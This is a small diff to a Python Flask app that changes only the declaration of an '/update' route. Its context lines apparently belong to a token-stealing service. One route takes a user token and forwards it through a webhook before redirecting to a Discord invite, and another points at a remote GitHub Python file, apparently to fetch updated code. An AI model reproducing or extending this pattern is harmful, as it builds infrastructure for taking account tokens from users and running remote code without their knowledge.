@@ -26,7 +26,7 @@ def index(token):
       hook.send(token)
   return redirect("https://discord.gg/sTp8ask4ay")
 
-@app.route('/update', methods=['GET'])
+@app.route('/update')
 def update():
     url = "https://raw.githubusercontent.com/43a1723/test2/main/main.py"
     try:
